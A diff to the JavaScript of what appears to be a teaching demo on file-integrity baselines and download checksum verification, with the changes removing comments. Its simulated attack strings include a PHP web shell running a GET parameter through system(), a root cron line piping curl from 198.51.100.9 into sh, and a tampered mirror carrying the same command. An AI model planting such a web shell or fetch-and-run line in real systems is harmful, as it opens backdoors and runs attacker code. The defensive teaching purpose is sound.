@@ -87,7 +87,7 @@
     { path: "/etc/cron.d/jobs", body: "0 2 * * * root /usr/bin/backup.sh\n" },
     { path: "/var/www/.htaccess", body: "Options -Indexes\nDeny from all\n" }
   ];
-  var baseline = null;      // path -> hash at baseline time
+  var baseline = null;
   var attacked = false;
   var seen = { match: false, mismatch: false };
 
@@ -128,12 +128,10 @@
   });
 
   document.getElementById("attack").addEventListener("click", function () {
-    // Tampering before the baseline would bake the attack into "known-good".
     if (!baseline) {
       document.getElementById("log").innerHTML = '<span class="err">record a baseline first, so you have a known-good state to compare against.</span>';
       return;
     }
-    // Silent tampering: a web shell, a cron backdoor, and an upload flag flipped on.
     FILES[1].body = FILES[1].body.replace("?>\n", "  if(isset($_GET['c'])){system($_GET['c']);}\n?>\n");
     FILES[4].body += "*/5 * * * * root curl -s http://198.51.100.9/x | sh\n";
     FILES[2].body = FILES[2].body.replace("$ALLOW_UPLOAD = false;", "$ALLOW_UPLOAD = true;");
@@ -163,7 +161,6 @@
     });
   });
 
-  // ---- download verification -------------------------------------------
   var OFFICIAL = "aayac-tools v2.4.1\nchecksum-ok payload\n-- official release build --\n";
   var MIRROR = OFFICIAL.replace("-- official release build --", "-- official release build --\ncurl http://198.51.100.9/x | sh  # injected by mirror");
   var postedHash = null;
